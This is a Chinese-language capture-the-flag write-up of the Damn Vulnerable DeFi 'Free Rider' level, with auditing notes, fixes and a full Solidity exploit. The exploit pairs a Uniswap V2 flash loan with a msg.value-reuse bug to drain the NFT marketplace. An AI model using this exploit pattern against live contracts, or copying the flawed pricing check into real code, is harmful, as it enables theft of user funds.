# Free Rider 

## 一、题目简介

结合**合约逻辑漏洞 + Uniswap V2 闪电贷**考点。项目方上线了 NFT 交易市场，铸造了 6 枚 NFT，单枚售价 15 ETH，同时部署回收合约，只要集齐全部 6 枚 NFT 转入回收合约，即可领取 **45 ETH 官方赏金**。

玩家初始仅持有 **0.1 ETH**，资金不足以购买任何一枚 NFT，需要利用合约漏洞+闪电贷完成零资金套利、掏空全部 NFT 并领取赏金，完成通关。

核心环境参数：

- NFT 总量：6 枚（tokenId 0\~5）

- NFT 单价：15 ETH/枚

- 通关赏金：45 ETH

- 玩家初始资金：0.1 ETH（不足以购买 NFT）

目标：获取市场全部 6 枚 NFT，转入官方回收合约，触发赏金发放，完成关卡。

## 二、审计视角分析

### 1\. NFT 市场批量购买计价逻辑漏洞

市场合约 `buyMany` 支持批量购买 NFT，内部循环调用私有方法 `_buyOne` 完成单笔购买，漏洞存在于单笔购买校验逻辑：

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) revert TokenNotOffered(tokenId);
    // 仅校验本次交易 msg.value >= 单枚NFT价格
    if (msg.value < priceToPay) revert InsufficientPayment();
    // 省略转账、付款逻辑
}
```

漏洞致命缺陷：合约**不会累加批量购买总价、不会消耗支付的 ETH**。仅校验用户传入的 ETH 大于等于单枚 NFT 价格。

攻击逻辑：仅支付**15 ETH**，即可批量购买全部 6 枚定价 15 ETH 的 NFT，极大成本套利。

### 2\. 资金限制导致必须搭配闪电贷攻击

玩家仅持有 0.1 ETH，无自有资金完成购买。因此必须借助 **Uniswap V2 闪电贷**：瞬时借入 15 WETH，完成 NFT 购买套利，领取赏金后归还闪电贷本息，实现零自有资金攻击。

### 3\. 隐藏业务细节漏洞

Uniswap V2 闪电贷借出的是 **WETH**，但 NFT 市场购买仅支持**原生 ETH**，合约缺少 WETH/ETH 适配逻辑，开发者极易忽略该转换步骤，导致交易余额不足报错。

## 三、开发者默认安全假设

1. **批量逻辑想当然安全**：默认批量购买会累计计价，未单独校验批量总金额，仅校验单笔价格。

2. **忽略 msg.value 特性**：单次交易中 `msg.value` 全局唯一，循环调用不会消耗余额，可复用校验条件。

3. **未考虑闪电贷攻击**：默认用户必须使用自有资金购买，忽略闪电贷瞬时借贷的攻击场景。

4. **币种适配缺失**：未兼容 WETH 支付，未预判用户通过闪电贷获取资金的攻击方式。

## 四、同类项目通用审计盯点

1. **批量操作必核计价逻辑**：所有批量购买、批量结算金融合约，必须累加总费用，禁止仅校验单笔价格。

2. **警惕 msg.value 复用漏洞**：单次交易内循环处理多笔业务，msg\.value 不会递减，极易引发低价批量购买漏洞。

3. **全覆盖资金场景校验**：必须预判闪电贷、瞬时借贷等零资金攻击场景，不能依赖用户自有资金风控。

4. **统一支付币种逻辑**：金融市场合约需统一原生 ETH/WETH 支付逻辑，避免币种适配漏洞。

## 五、完整解题思路

1. **闪电贷借贷**：部署攻击合约，通过 Uniswap V2 Pair 闪电贷借入 15 WETH。

2. **币种转换**：将借入的 WETH 调用 `withdraw` 拆解为原生 ETH，适配市场购买要求。

3. **批量套利购买**：利用批量计价漏洞，支付 15 ETH，一次性购买全部 6 枚 NFT。

4. **领取官方赏金**：将全部 NFT 转入回收合约，满足集齐6枚NFT的条件，触发45 ETH赏金发放。

5. **归还闪电贷本息**：计算闪电贷手续费，组装 WETH 还款，完成借贷清算，无负债离场。

## 六、报错复盘

### 报错1：OutOfFunds 余额不足

**原因**：闪电贷借出的是 WETH，市场仅支持原生 ETH，未做 WETH 提现转换。

**解决**：新增 `weth.withdraw()` 将 WETH 转为原生 ETH。

### 报错2：hex 格式编译错误

**原因**：hex"1"为奇数位数，Solidity 不合法。

**解决**：修改为合法偶数位 hex"01"。

### 报错3：合约嵌套/变量未定义编译失败

**原因**：Foundry 测试文件语法限制，不可随意嵌套合约、变量名与官方测试文件不匹配。

**解决**：统一官方内置变量名，规范攻击合约层级与入参类型。

### 报错4：non-contract address 回调失败

**原因**：闪电贷回调数据格式异常，合约未被识别为合法回调接收地址。

**解决**：使用标准合法回调字节数据，规范 swap 调用参数。

## 七、EXP
```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

// 攻击合约放置在测试合约上方，不可内嵌函数内
contract FlashBorrower {
    using Address for address payable;

    IUniswapV2Pair immutable pair;
    FreeRiderNFTMarketplace immutable marketplace;
    FreeRiderRecoveryManager immutable recovery;
    DamnValuableNFT immutable nft;
    WETH immutable weth;
    address immutable player;

    constructor(IUniswapV2Pair _pair, FreeRiderNFTMarketplace _marketplace, FreeRiderRecoveryManager _recovery, DamnValuableNFT _nft, WETH _weth, address _player) {
        pair = _pair;
        marketplace = _marketplace;
        recovery = _recovery;
        nft = _nft;
        weth = _weth;
        player = _player;
    }

    function flashBorrow() external {
        pair.swap(15 ether, 0, address(this), hex"01");
    }

    function uniswapV2Call(address, uint amt, uint, bytes calldata) external {
        require(msg.sender == address(pair));
        
        // 核心步骤：闪电贷借出WETH，必须提现转为原生ETH才可购买NFT
        weth.withdraw(amt);

        // 利用批量计价漏洞，15 ETH 购买全部6枚NFT
        uint256[] memory ids = new uint256[](6);
        for (uint i=0; i<6; i++) ids[i] = i;
        marketplace.buyMany{value: amt}(ids);

        // 转移所有NFT至回收合约，触发45ETH赏金发放
        for (uint i=0; i<6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(player));
        }

        // 计算闪电贷手续费，组装WETH完成还款清算
        uint fee = (amt * 3) / 997 + 1;
        weth.deposit{value: amt + fee}();
        weth.transfer(address(pair), amt + fee);
    }

    // 实现ERC721接收接口，合规接收NFT
    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // 接收原生ETH
    receive() external payable {}
}

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0))));
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json", abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager =
            new FreeRiderRecoveryManager{value: BOUNTY}(player, address(nft), recoveryManagerOwner, BOUNTY);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_freeRider() public checkSolvedByPlayer {
       FlashBorrower borrower = new FlashBorrower(
        uniswapPair,
        marketplace,
        recoveryManager,
        nft,
        weth,
        player
    );
    borrower.flashBorrow();
}


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

```

## 八、合约修复方案

1. **修复批量计价漏洞**：批量购买时累加所有 NFT 单价，校验用户支付的 `msg.value`大于等于**总价格**，而非单笔价格。

2. **消耗支付余额**：每完成一笔购买，扣除对应 ETH，禁止 `msg.value` 复用。

3. **增加借贷风控**：增加闪电贷、瞬时资金检测，限制短时间内大额批量交易。

4. **统一支付体系**：兼容 ETH/WETH 双支付方式，标准化币种转换逻辑，避免资金适配漏洞。

5. **单笔交易限额**：限制单次批量购买 NFT 数量，防止池子资产被一次性掏空。

## 九、漏洞总结

Free Rider 核心由**批量购买计价逻辑错误**高危漏洞主导，搭配 Uniswap V2 闪电贷完成零成本套利。开发者忽视了`msg.value` 在单次交易中全局不变的特性，导致批量低价购买资产。结合币种转换、闪电贷回调、NFT 接收接口等知识点，考 DeFi 合约审计攻击能力。

